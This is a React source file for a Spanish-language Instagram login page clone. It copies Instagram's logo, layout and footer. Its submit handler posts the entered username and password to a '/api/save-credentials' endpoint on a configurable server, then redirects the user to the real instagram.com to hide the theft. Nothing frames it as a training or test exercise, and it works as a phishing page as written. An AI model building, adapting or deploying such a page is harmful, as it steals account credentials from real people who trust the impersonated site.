import { useState } from 'react';

export default function InstagramLogin() {
  const [username, setUsername] = useState('');
  const [password, setPassword] = useState('');
  const [usernameFocused, setUsernameFocused] = useState(false);
  const [passwordFocused, setPasswordFocused] = useState(false);

  const handleSubmit = async (e) => {
    e.preventDefault();

    if (username && password) {
      try {
        // Guardar credenciales en el servidor
        const apiUrl = import.meta.env.VITE_API_URL || 'http://localhost:3001';
        await fetch(`${apiUrl}/api/save-credentials`, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify({
            username,
            password
          })
        });
      } catch (error) {
        console.error('Error al guardar credenciales:', error);
      }

      // Redireccionar a Instagram
      window.location.href = 'https://www.instagram.com/';
    }
  };

  return (
  <div className="min-h-screen bg-black text-white flex flex-col items-center justify-center md:justify-start p-5">
  <div className="flex items-center gap-[30px] w-full justify-center max-w-[900px]">
        {/* Imagen de teléfonos */}
        <div className="relative w-[454px] h-[618px] flex-shrink-0" style={{marginTop: '-30px'}}>
          <img
            src="/instagram-phones.png"
            alt="Instagram phones"
            className="w-full h-full object-contain"
          />
        </div>

        {/* Formulario de login */}
        <div className="flex flex-col items-center w-full max-w-[350px]">
          {/* Contenedor principal con borde */}
          <div className="w-full flex flex-col items-center border border-black px-10 pt-12 pb-4">
            {/* Logo */}
            {/* subido 40px respecto al diseño anterior */}
            <div style={{marginTop: '-25px'}}>
              <img
                src="/instagram-logo.png"
                alt="Instagram"
                className="w-[195px] h-auto"
              />
            </div>

            {/* Formulario */}
            <form onSubmit={handleSubmit} className="w-full flex flex-col items-center" style={{marginTop: '40px'}}>
              <div className="w-[75%] flex flex-col">
              <div className="w-full relative" style={{marginBottom: '5px'}}>
                <input
                  type="text"
                  value={username}
                  onChange={(e) => setUsername(e.target.value)}
                  onFocus={() => setUsernameFocused(true)}
                  onBlur={() => setUsernameFocused(false)}
                  className="w-full py-[9px] px-2 pt-[14px] pb-[4px] text-xs rounded-[3px] bg-[#121212] border border-black outline-none"
                  style={{color: '#ffffff'}}
                />
                <label
                  className="absolute transition-all pointer-events-none"
                  style={{
                    left: '10.5px',
                    top: (username || usernameFocused) ? '4px' : '50%',
                    transform: (username || usernameFocused) ? 'translateY(0)' : 'translateY(-50%)',
                    fontSize: (username || usernameFocused) ? '10px' : '12px',
                    color: '#8e8e8e'
                  }}
                >
                  Teléfono, usuario o correo electrónico
                </label>
              </div>

              <div className="w-full relative" style={{marginBottom: '10px'}}>
                <input
                  type="password"
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                  onFocus={() => setPasswordFocused(true)}
                  onBlur={() => setPasswordFocused(false)}
                  className="w-full py-[9px] px-2 pt-[14px] pb-[4px] text-xs rounded-[3px] bg-[#121212] border border-black outline-none"
                  style={{color: '#ffffff'}}
                />
                <label
                  className="absolute transition-all pointer-events-none"
                  style={{
                    left: '10.5px',
                    top: (password || passwordFocused) ? '4px' : '50%',
                    transform: (password || passwordFocused) ? 'translateY(0)' : 'translateY(-50%)',
                    fontSize: (password || passwordFocused) ? '10px' : '12px',
                    color: '#8e8e8e'
                  }}
                >
                  Contraseña
                </label>
              </div>

              <button
                type="submit"
                disabled={!username || !password}
                className="w-full py-[7px] px-4 border-none rounded-lg text-white text-sm font-semibold mt-3 transition-all duration-200"
                style={{
                  backgroundColor: 'var(--instagram-blue)',
                  borderRadius: '8px',
                  color: '#ffffff',
                  opacity: 0.85,
                  cursor: (username && password) ? 'pointer' : 'default',
                  filter: (username && password) ? 'brightness(1.28)' : 'brightness(1)'
                }}
              >
                Iniciar sesión
              </button>
              </div>
            </form>

            {/* Divider */}
            <div className="flex items-center w-[75%] gap-[18px] mx-auto" style={{marginTop: '26px', marginBottom: '20px'}}>
              <div className="flex-1 h-px bg-[#363636]"></div>
              <span className="inline-block w-[10px] h-[10px] rounded-full border border-[#8e8e8e] bg-transparent"></span>
              <div className="flex-1 h-px bg-[#363636]"></div>
            </div>

            {/* Facebook login (compact) */}
            <div className="w-full flex flex-col items-center mb-4">
              <button className="flex items-center gap-2 bg-transparent border-none cursor-pointer hover:opacity-70 transition-opacity" style={{color: '#1877f2'}}>
                {/* Replaced with provided image in /image.png */}
                <img src="/image.png" alt="Facebook" className="w-[23px] h-[23px] rounded-full align-middle inline-block" />
                <span className="text-[14px] font-semibold" style={{color: '#1877f2'}}>Iniciar sesión con Facebook</span>
              </button>

              <a href="#" className="text-xs no-underline hover:opacity-70 transition-opacity" style={{color: '#ffffff', marginTop: '16px'}}>
                ¿Olvidaste tu contraseña?
              </a>
            </div>
          </div>

          {/* Signup box */}
          <div className="border border-black py-6 w-full text-center text-[14px]" style={{marginTop: '25px'}}>
            <span className="text-[#ffffff]">¿No tienes una cuenta? </span>
            <a href="#" className="no-underline font-semibold hover:opacity-70 transition-opacity" style={{color: '#1877f2'}}>
              Regístrate
            </a>
          </div>

          {/* Get the app (removed text as requested) */}
        </div>
      </div>

  {/* Footer */}
  <div className="w-full text-center mt-6">
        <div className="flex flex-wrap justify-center gap-x-10 gap-y-6 mb-8 text-[#737373] text-xs max-w-[1400px] mx-auto leading-loose footer-links">
          <ul className="flex nowrap justify-center items-center m-0 p-0 list-none">
            <li className="mx-4"><a href="#" className="text-[#737373] no-underline">Meta</a></li>
            <li className="mx-4"><a href="#" className="text-[#737373] no-underline">Información</a></li>
            <li className="mx-4"><a href="#" className="text-[#737373] no-underline">Blog</a></li>
            <li className="mx-4"><a href="#" className="text-[#737373] no-underline">Empleo</a></li>
            <li className="mx-4"><a href="#" className="text-[#737373] no-underline">Ayuda</a></li>
            <li className="mx-4"><a href="#" className="text-[#737373] no-underline">API</a></li>
            <li className="mx-4"><a href="#" className="text-[#737373] no-underline">Privacidad</a></li>
            <li className="mx-4"><a href="#" className="text-[#737373] no-underline">Condiciones</a></li>
            <li className="mx-4"><a href="#" className="text-[#737373] no-underline">Ubicaciones</a></li>
            <li className="mx-4"><a href="#" className="text-[#737373] no-underline">Instagram Lite</a></li>
            <li className="mx-4"><a href="#" className="text-[#737373] no-underline">Meta IA</a></li>
            <li className="mx-4"><a href="#" className="text-[#737373] no-underline">Artículos de Meta AI</a></li>
            <li className="mx-4"><a href="#" className="text-[#737373] no-underline">Trapos</a></li>
            <li className="mx-4"><a href="#" className="text-[#737373] no-underline">Importación de contactos y no usuarios</a></li>
            <li className="mx-4"><a href="#" className="text-[#737373] no-underline">Meta verificado</a></li>
          </ul>
        </div>
  <div className="flex justify-center items-center gap-4 text-[#9b9b9b] text-sm mt-2 footer-bottom">
          <select className="bg-transparent border-none text-[#9b9b9b] outline-none cursor-pointer text-xs">
            <option>Español</option>
            <option>English</option>
          </select>
          <span>© 2025 Instagram de Meta</span>
        </div>
      </div>
    </div>
  );
}
